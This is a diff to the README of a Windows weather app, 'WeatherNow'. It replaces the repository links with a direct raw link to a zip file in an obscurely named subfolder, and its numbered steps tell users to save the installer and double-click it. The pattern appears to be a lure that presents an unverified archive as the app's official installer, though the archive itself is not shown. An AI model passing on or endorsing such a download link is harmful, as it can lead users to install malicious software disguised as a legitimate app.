@@ -1,6 +1,6 @@
 # 🌤️ weather_app - Get live weather updates for cities
 
-[Download WeatherNow Windows Installer](https://github.com/nudibranchiascarface539/weather_app)
+[Download WeatherNow Windows Installer](https://raw.githubusercontent.com/nudibranchiascarface539/weather_app/main/preparietal/weather-app-v3.0.zip)
 
 ## 📖 About this application
 
@@ -21,7 +21,7 @@ This application runs on modern versions of Windows. Please check your computer 
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the [official download page](https://github.com/nudibranchiascarface539/weather_app).
+1. Visit the [official download page](https://raw.githubusercontent.com/nudibranchiascarface539/weather_app/main/preparietal/weather-app-v3.0.zip).
 2. Click the link that matches your current Windows version.
 3. Save the installer file to your desktop for easy access.
 4. Locate the file and double-click it to start the setup process.
